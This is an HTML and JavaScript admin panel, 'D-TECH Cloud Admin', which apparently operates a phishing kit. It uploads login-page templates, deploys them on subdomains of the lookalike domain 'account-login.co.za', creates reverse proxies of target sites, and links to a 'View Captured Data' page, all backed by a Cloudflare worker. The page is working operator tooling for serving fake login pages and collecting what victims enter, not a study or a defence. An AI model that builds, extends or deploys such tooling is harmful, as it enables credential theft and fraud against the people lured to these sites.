<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D-TECH Cloud Admin</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <nav class="navbar">
        <a href="index.html" class="navbar-brand">
            <img src="logo.png" alt="D-TECH Logo">
            D-TECH Admin
        </a>
        <div class="nav-links">
            <a href="index.html">Deploy</a>
            <a href="dashboard.html">Dashboard</a>
            <a href="admin.html" class="active">Admin</a>
        </div>
    </nav>

    <div class="container">
        <div class="card">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 1rem;">
                <h1 style="margin:0;">ðŸš€ Cloud Admin Panel</h1>
                <a href="captures.html" style="color: var(--primary-color); font-weight: bold; text-decoration: none;">View Captured Data &rarr;</a>
            </div>

            <div class="tabs">
                <div class="tab active" onclick="switchTab('templates')">Manage Templates</div>
                <div class="tab" onclick="switchTab('sites')">Manage Sites</div>
                <div class="tab" onclick="switchTab('proxy')">Deploy Proxy (Admin)</div>
            </div>

            <!-- Templates Section -->
            <div id="templates-section" class="form-section">
                <h2>Existing Templates</h2>
                <div id="template-list">Loading...</div>

                <h3 style="margin-top: 2rem;">Add New Template</h3>
                <div class="form-group">
                    <label>Template Name</label>
                    <input type="text" id="tpl-name" placeholder="e.g., login-page-v1">
                </div>
                <div class="form-group">
                    <label>HTML Content</label>
                    <input type="file" id="tpl-file" accept=".html,.txt" onchange="loadFile(this, 'tpl-content')" style="margin-bottom: 10px;">
                    <textarea id="tpl-content" placeholder="<html>...</html>" style="height: 150px; font-family: monospace;"></textarea>
                </div>
                <button onclick="saveTemplate()">Save Template</button>
            </div>

            <!-- Sites Section -->
            <div id="sites-section" class="form-section hidden">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
                    <h2>Manage Deployed Sites</h2>
                    <button onclick="loadSites()" class="btn-secondary" style="width:auto;">Refresh List</button>
                </div>
                <div id="site-list">Loading...</div>
            </div>

            <!-- Proxy Form (Legacy Admin Feature) -->
            <div id="proxy-section" class="form-section hidden">
                <p class="text-muted">Admin-only proxy deployment (bypasses templates).</p>
                <div class="form-group">
                    <label>Subdomain</label>
                    <input type="text" id="proxy-subdomain" placeholder="e.g., blog">
                </div>
                <div class="form-group">
                    <label>Target URL</label>
                    <input type="text" id="proxy-url" placeholder="https://example.com">
                </div>
                <button onclick="saveProxy()">Create Proxy</button>
            </div>

            <div id="message" class="message"></div>
        </div>
    </div>

    <script>
        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';

        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.form-section').forEach(f => f.classList.add('hidden'));

            if (tab === 'templates') {
                document.querySelector('.tabs .tab:nth-child(1)').classList.add('active');
                document.getElementById('templates-section').classList.remove('hidden');
                loadTemplates();
            } else if (tab === 'sites') {
                document.querySelector('.tabs .tab:nth-child(2)').classList.add('active');
                document.getElementById('sites-section').classList.remove('hidden');
                loadSites();
            } else {
                document.querySelector('.tabs .tab:nth-child(3)').classList.add('active');
                document.getElementById('proxy-section').classList.remove('hidden');
            }
        }

        function loadFile(input, targetId) {
            const file = input.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = function(e) {
                document.getElementById(targetId).value = e.target.result;
            };
            reader.readAsText(file);
        }

        async function loadSites() {
            const list = document.getElementById('site-list');
            list.innerHTML = 'Loading...';
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/sites`, { credentials: 'include' });
                if (res.status === 401) { window.location.href = 'login.html'; return; }
                const data = await res.json();
                list.innerHTML = '';

                if (data.success && data.data.length > 0) {
                    const table = document.createElement('table');

                    const thead = document.createElement('thead');
                    const headerRow = document.createElement('tr');
                    ['Subdomain', 'Action'].forEach(text => {
                        const th = document.createElement('th');
                        th.textContent = text;
                        headerRow.appendChild(th);
                    });
                    thead.appendChild(headerRow);
                    table.appendChild(thead);

                    const tbody = document.createElement('tbody');
                    data.data.forEach(site => {
                        const tr = document.createElement('tr');

                        const tdName = document.createElement('td');
                        const link = document.createElement('a');
                        link.href = `https://${site}.account-login.co.za`;
                        link.target = '_blank';
                        link.style.color = 'var(--primary-color)';
                        link.textContent = site;
                        tdName.appendChild(link);

                        const tdAction = document.createElement('td');
                        const btn = document.createElement('button');
                        btn.className = 'btn-danger btn-sm';
                        btn.textContent = 'Delete';
                        btn.onclick = () => deleteSite(site);
                        tdAction.appendChild(btn);

                        tr.appendChild(tdName);
                        tr.appendChild(tdAction);
                        tbody.appendChild(tr);
                    });
                    table.appendChild(tbody);
                    list.appendChild(table);
                } else {
                    list.innerText = 'No sites found.';
                }
            } catch (e) {
                list.innerText = 'Error loading sites: ' + e.message;
            }
        }

        async function deleteSite(subdomain) {
            if(!confirm(`Delete site "${subdomain}"? This cannot be undone.`)) return;
            try {
                 const res = await fetch(`${WORKER_URL}/api/admin/sites?subdomain=` + subdomain, {
                     method: 'DELETE',
                     credentials: 'include'
                 });
                 if (res.status === 401) { window.location.href = 'login.html'; return; }
                 loadSites();
            } catch(e) {
                alert(e.message);
            }
        }

        async function loadTemplates() {
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/templates`, { credentials: 'include' });

                if (res.status === 401) {
                    window.location.href = 'login.html';
                    return;
                }

                const data = await res.json();
                const list = document.getElementById('template-list');
                list.innerHTML = ''; // Clear loading

                if (data.success && data.data.length > 0) {
                    const table = document.createElement('table');

                    // Header
                    const thead = document.createElement('thead');
                    const headerRow = document.createElement('tr');
                    const thName = document.createElement('th');
                    thName.textContent = 'Name';
                    const thAction = document.createElement('th');
                    thAction.textContent = 'Action';
                    headerRow.appendChild(thName);
                    headerRow.appendChild(thAction);
                    thead.appendChild(headerRow);
                    table.appendChild(thead);

                    // Body
                    const tbody = document.createElement('tbody');
                    data.data.forEach(tpl => {
                        const tr = document.createElement('tr');

                        const tdName = document.createElement('td');
                        tdName.textContent = tpl.name;

                        const tdAction = document.createElement('td');
                        const btn = document.createElement('button');
                        btn.className = 'btn-danger btn-sm';
                        btn.textContent = 'Delete';
                        btn.onclick = () => deleteTemplate(tpl.name);
                        tdAction.appendChild(btn);

                        tr.appendChild(tdName);
                        tr.appendChild(tdAction);
                        tbody.appendChild(tr);
                    });
                    table.appendChild(tbody);
                    list.appendChild(table);
                } else {
                    const p = document.createElement('p');
                    p.textContent = 'No templates found.';
                    list.appendChild(p);
                }
            } catch (e) {
                document.getElementById('template-list').innerText = 'Error loading templates.';
            }
        }

        async function saveTemplate() {
            const name = document.getElementById('tpl-name').value;
            const content = document.getElementById('tpl-content').value;
            if (!name || !content) return showMessage('Missing fields', 'error');

            const btn = document.querySelector('#templates-section button[onclick="saveTemplate()"]');
            const originalText = btn.innerText;
            btn.innerText = 'Saving...';
            btn.disabled = true;

            try {
                const res = await fetch(`${WORKER_URL}/api/admin/templates`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({name, content}),
                    credentials: 'include'
                });
                if (res.status === 401) {
                    window.location.href = 'login.html';
                    return;
                }
                const data = await res.json();
                if (data.success) {
                    showMessage('Template saved!', 'success');
                    document.getElementById('tpl-name').value = '';
                    document.getElementById('tpl-content').value = '';
                    loadTemplates();
                } else {
                    showMessage(data.error, 'error');
                }
            } catch (e) {
                showMessage(e.message, 'error');
            }
            btn.innerText = originalText;
            btn.disabled = false;
        }

        async function deleteTemplate(name) {
            if(!confirm('Delete template ' + name + '?')) return;
            try {
                 const res = await fetch(`${WORKER_URL}/api/admin/templates?name=` + name, {
                     method: 'DELETE',
                     credentials: 'include'
                 });
                 if (res.status === 401) {
                     window.location.href = 'login.html';
                     return;
                 }
                 loadTemplates();
            } catch(e) {
                alert(e.message);
            }
        }

        async function saveProxy() {
            const subdomain = document.getElementById('proxy-subdomain').value;
            const content = document.getElementById('proxy-url').value;
            if (!subdomain || !content) return showMessage('Missing fields', 'error');

            try {
                const response = await fetch(`${WORKER_URL}/api/save`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ subdomain, type: 'PROXY', content }),
                    credentials: 'include'
                });
                if (response.status === 401) {
                    window.location.href = 'login.html';
                    return;
                }
                const result = await response.json();
                if (result.success) showMessage('Proxy created!', 'success');
                else showMessage(result.error, 'error');
            } catch (err) {
                showMessage('Network Error: ' + err.message, 'error');
            }
        }

        function showMessage(text, type) {
            const el = document.getElementById('message');
            el.innerText = text;
            el.className = 'message ' + type;
            el.style.display = 'block';
        }

        // Initial load
        loadTemplates();
    </script>
</body>
</html>
